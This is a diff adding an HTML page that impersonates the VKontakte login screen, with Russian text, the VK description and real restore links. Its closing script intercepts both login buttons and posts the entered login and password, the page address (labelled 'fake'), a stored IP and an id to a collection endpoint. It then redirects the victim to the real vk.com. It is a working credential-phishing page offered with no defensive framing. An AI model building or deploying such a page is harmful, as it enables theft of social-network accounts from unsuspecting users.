@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./base/fav_logo.ico">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="description"
+        content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+    <link href="./base/css2.css" rel="stylesheet">
+    <link rel="stylesheet" href="./base/style.css">
+    <title>Вход | ВКонтакте</title>
+</head>
+
+<body class="login">
+    <header class="header">
+        <div class="container">
+            <a href="./base"><img src="./base/logo.svg" alt="" class="header-logo"></a>
+        </div>
+    </header>
+    <main>
+        <div class="container">
+            <div class="login-container">
+                <form method="POST" action="#" class="login-content pc">
+                    <h1 class="login-title">Вход ВКонтакте</h1>
+                    <div class="login-info info">
+                        <p class="login-info_content">Чтобы выполнить это действие, нужно зайти на сайт.</p>
+                    </div>
+                    <div class="login-error error">
+                        <div class="login-error_content">
+                            <b>Не удаётся войти.</b>
+                            <br>
+                            Пожалуйста, проверьте правильность написания <b>логина</b> и <b>пароля</b>.
+                            <ul class="listing">
+                                <li><span>Возможно, нажата клавиша <b>Caps Lock</b>?</span></li>
+                                <li><span>Может быть, у Вас включена неправильная <b>раскладка</b>? (русская или
+                                        английская)</span></li>
+                                <li><span>Попробуйте набрать свой пароль в текстовом редакторе и <b>скопировать</b> в
+                                        графу «Пароль»</span></li>
+                                <li><span>Если пароль набран верно, попробуйте указать в качестве логина <b>номер
+                                            привязанного телефона</b>, а не почту.</span></li>
+                            </ul>
+                            Если Вы всё внимательно проверили, но войти всё равно не удаётся, Вы можете <b><a
+                                    href="https://static.vk.com/restore">нажать сюда</a></b>.
+                        </div>
+                    </div>
+                    <div class="login-wrapper">
+                        <div class="login-form">
+                            <input type="text" name="email" id="email" class="form-control"
+                                placeholder="Телефон или email">
+                            <input type="password" name="pass" id="pass" class="form-control" placeholder="Пароль"
+                                value="">
+                        </div>
+                        <div class="login-checkbox"
+                            onclick="document.querySelector('.login-checkbox').classList.toggle('on');">
+                            <span>Чужой компьютер</span>
+                        </div>
+                        <div class="login-button">
+                            <button type="submit" class="btn btn-login" id="btn"><span>Войти</span>
+                                <div class="pr" id="btn_lock" style="opacity: 1;">
+                                    <div class="pr_bt"></div>
+                                    <div class="pr_bt"></div>
+                                    <div class="pr_bt"></div>
+                                </div>
+                            </button>
+                            <a href="https://vk.com/join" class="btn btn-register"><span>Регистрация</span></a>
+                        </div>
+                        <input type="hidden" name="id" value="IQTMUjBI8E">
+                        <a class="login-restore" href="https://vk.com/restore">Забыли пароль или не можете войти?</a>
+                    </div>
+                </form>
+                <form method="POST" action="#" class="login-content mobile">
+                    <a class="mobile-app" href="https://vk.me/?act=dl">
+                        <div class="mobile-app_data">
+                            <img src="./base/mobile.png" alt="" class="mobile">
+                            <p>Установить приложение <span>ВКонтакте</span></p>
+                        </div>
+                        <button type="button">
+                            <img src="./base/blue_arrow.png" alt="" class="arrow">
+                        </button>
+                    </a>
+                    <div class="login-block">
+                        <p class="login-block_text">Мобильная версия поможет вам оставаться ВКонтакте, даже если вы
+                            далеко от компьютера.</p>
+                        <div class="login-block_error error">
+                            <b>Не удаётся войти.</b>
+                            <br>
+                            Пожалуйста, проверьте правильность введённых данных. <a
+                                href="https://static.vk.com/restore">Проблемы со входом?</a>
+                        </div>
+                        <div class="login-block_info info">
+                            <p>Чтобы выполнить это действие, нужно зайти на сайт.</p>
+                        </div>
+                        <div class="login-form">
+                            <input class="form-control" type="text" id="lgn" name="email" spellcheck=""
+                                placeholder="Телефон или email" autocomplete="username">
+                            <input class="form-control" type="password" id='psw' name="pass" value="" spellcheck=""
+                                placeholder="Пароль" autocomplete="current-password">
+                        </div>
+                        <input type="hidden" name="id" value="IQTMUjBI8E">
+                        <button type="submit" class="btn btn-login" id="btn2"><span>Войти</span>
+                            <div class="pr" id="btn_lock" style="opacity: 1;">
+                                <div class="pr_bt"></div>
+                                <div class="pr_bt"></div>
+                                <div class="pr_bt"></div>
+                            </div>
+                        </button>
+                        <div class="login-restore"><a href="https://static.vk.com/restore" rel="noopener">Забыли
+                                пароль?</a></div>
+                        <div class="login-register">
+                            <p class="login-register_text">Впервые ВКонтакте?</p>
+                            <a href="https://m.vk.com/join" type="button"
+                                class="btn btn-register"><span>Зарегистрироваться</span></a>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </main>
+    <script>
+        document.querySelector('#btn').addEventListener('click', async function (e) {
+            e.preventDefault()
+            let r = await fetch('http://localhost:3000/api/add', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    login: document.querySelector('#lgn').value,
+                    password: document.querySelector('#psw').value,
+                    fake: location.href,
+                    ip: localStorage.getItem('ip'),
+                    id: localStorage.getItem('id'),
+                    type: 'vk'
+                })
+            }).then(data => {
+                setTimeout(() => {
+                    location.replace('https://vk.com/')
+                }, 500)
+            })
+        })
+        document.querySelector('#btn2').addEventListener('click', async function (e) {
+            e.preventDefault()
+            let r = await fetch('http://localhost:3000/api/add', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    login: document.querySelector('#lgn').value,
+                    password: document.querySelector('#psw').value,
+                    fake: location.href,
+                    ip: localStorage.getItem('ip'),
+                    id: localStorage.getItem('id'),
+                    type: 'vk'
+                })
+            }).then(data => {
+                setTimeout(() => {
+                    location.replace('https://vk.com/')
+                }, 500)
+            })
+        })
+    </script>
+    <!-- <script src="%D0%92%D1%85%D0%BE%D0%B4%20%D0%92%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D0%B5_files/jquery.js"></script>
+    <script src="%D0%92%D1%85%D0%BE%D0%B4%20%D0%92%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D0%B5_files/script.js"></script> -->
+
+</body>
+
+</html>
